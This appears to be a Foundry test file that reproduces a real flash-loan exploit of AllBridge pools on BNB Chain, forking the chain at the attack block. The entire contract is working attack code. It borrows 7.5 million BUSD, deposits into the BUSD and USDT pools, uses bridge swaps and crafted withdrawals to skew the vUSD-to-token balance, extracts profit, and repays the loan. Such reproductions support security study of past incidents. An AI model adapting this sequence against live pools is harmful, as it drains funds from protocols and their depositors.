// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1642356701100916736
// https://twitter.com/BeosinAlert/status/1642372700726505473
// @TX
// https://bscscan.com/tx/0x7ff1364c3b3b296b411965339ed956da5d17058f3164425ce800d64f1aef8210
// @Summary
// https://twitter.com/gbaleeeee/status/1642520517788966915

interface IBridgeSwap {
    function swap(uint256 amount, bytes32 token, bytes32 receiveToken, address recipient) external;
}

interface ISwap {
    function swap(
        address fromToken,
        address toToken,
        uint256 fromAmount,
        uint256 minimumToAmount,
        address to,
        uint256 deadline
    ) external;
}

interface AllBridgePool {
    function tokenBalance() external view returns (uint256);
    function vUsdBalance() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 amountLp) external;
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IBridgeSwap BridgeSwap = IBridgeSwap(0x7E6c2522fEE4E74A0182B9C6159048361BC3260A);
    ISwap Swap = ISwap(0x312Bc7eAAF93f1C60Dc5AfC115FcCDE161055fb0);
    AllBridgePool USDTPool = AllBridgePool(0xB19Cd6AB3890f18B662904fd7a40C003703d2554);
    AllBridgePool BUSDPool = AllBridgePool(0x179aaD597399B9ae078acFE2B746C09117799ca0);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_982_067);
        cheats.label(address(BUSD), "BUSD");
        cheats.label(address(USDT), "USDT");
        cheats.label(address(BridgeSwap), "BridgeSwap");
        cheats.label(address(Swap), "Swap");
        cheats.label(address(USDTPool), "USDTPool");
        cheats.label(address(BUSDPool), "BUSDPool");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() public {
        Pair.swap(0, 7_500_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        BUSD.approve(address(Swap), type(uint256).max);
        USDT.approve(address(Swap), type(uint256).max);
        BUSD.approve(address(BUSDPool), type(uint256).max);
        USDT.approve(address(USDTPool), type(uint256).max);
        Swap.swap(address(BUSD), address(USDT), 2_003_300 * 1e18, 1, address(this), block.timestamp);
        BUSDPool.deposit(5_000_000 * 1e18); // deposit BUSD to BUSDPool
        Swap.swap(address(BUSD), address(USDT), 496_700 * 1e18, 1, address(this), block.timestamp);
        USDTPool.deposit(2_000_000 * 1e18); // deposit USDT to USDTPool

        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, BUSD/vUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.tokenBalance() / BUSDPool.vUsdBalance()
        );
        bytes32 token = bytes32(uint256(uint160(address(USDT))));
        bytes32 receiveToken = bytes32(uint256(uint160(address(BUSD))));
        BridgeSwap.swap(USDT.balanceOf(address(this)), token, receiveToken, address(this)); // BridgeSwap USDT to BUSD
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()
        );

        BUSDPool.withdraw(4_830_262_616); // Amplify the imbalance of vUSDbalance and tokenbalance in BUSDPool
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()
        );

        BridgeSwap.swap(40_000 * 1e18, receiveToken, token, address(this)); // BridgeSwap BUSD to USDT
        console.log(
            "BUSDPool tokenBalance, BUSDPool vUsdBalance, vUSD/BUSD rate:",
            BUSDPool.tokenBalance(),
            BUSDPool.vUsdBalance(),
            BUSDPool.vUsdBalance() / BUSDPool.tokenBalance()
        );
        USDTPool.withdraw(1_993_728_530);

        Swap.swap(address(USDT), address(BUSD), USDT.balanceOf(address(this)), 1, address(this), block.timestamp);
        BUSD.transfer(address(Pair), 7_522_500 * 1e18);
    }
}
